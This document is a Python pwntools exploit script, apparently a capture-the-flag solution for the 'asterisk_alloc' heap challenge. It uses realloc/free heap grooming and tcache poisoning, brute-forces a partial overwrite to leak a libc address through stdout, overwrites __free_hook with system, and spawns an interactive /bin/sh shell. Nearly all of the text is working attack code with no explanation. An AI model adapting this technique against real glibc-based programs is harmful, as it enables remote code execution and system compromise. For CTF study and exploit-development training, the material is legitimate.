#!/usr/bin/env python
from pwn import *

def malloc(size, data='A'):
    s.sendlineafter('Your choice: ', '1')
    s.sendlineafter('Size: ', str(size))
    s.sendafter('Data: ', data)

def calloc(size, data='A'):
    s.sendlineafter('Your choice: ', '2')
    s.sendlineafter('Size: ', str(size))
    s.sendafter('Data: ', data)

def realloc(size, data='A'):
    s.sendlineafter('Your choice: ', '3')
    s.sendlineafter('Size: ', str(size))
    if size > 0:
        s.sendafter('Data: ', data)

def free(choice):
    s.sendlineafter('Your choice: ', '4')
    s.sendlineafter('Which: ', choice)

while True:
    if len(sys.argv) == 1:
        s = process('./asterisk_alloc-8f5838ad20b965740e53a3ac7c60b9c61b124f9053ff8fd608d9d064ee0ffb7c')
    else:
        s = remote('ast-alloc.chal.ctf.westerns.tokyo', 10001)

    libc = ELF('./libc-cd7c1a035d24122798d97a47a10f6e2b71d58710aecfd392375f1aa9bdde164d.so.6')

    realloc(0x500)
    realloc(0x4e0)
    realloc(0x18)
    realloc(0x88)
    free('r')
    realloc(0x18)
    realloc(0)
    realloc(0x68)
    free('r')
    free('r')
    realloc(0x4c0)
    realloc(0)
    realloc(0x18)
    realloc(0x88, p64(0) * 3 + p64(0x71) + '\x88\x57')
    realloc(0)
    realloc(0x68)
    malloc(0x68, '\xf0')

    try:
        res = s.recv(5)
        if res != '\n\0\0\0\0':
            s.close()
            continue
    except Exception:
        s.close()
        continue

    libc_base = u64(s.recv(8)) - 0x3ed8c0
    log.info('libc base: %#x' % libc_base)

    realloc(0)
    realloc(0x88)
    free('r')
    realloc(0x18)
    realloc(0)
    realloc(0x68)
    free('r')
    realloc(0)
    realloc(0x88, p64(0) * 3 + p64(0x21) + p64(libc_base + libc.symbols['__free_hook']))
    realloc(0)
    realloc(0x68)
    realloc(0)
    realloc(0x68, p64(libc_base + libc.symbols['system']))
    calloc(0x10, '/bin/sh')
    free('c')

    s.interactive()
    break
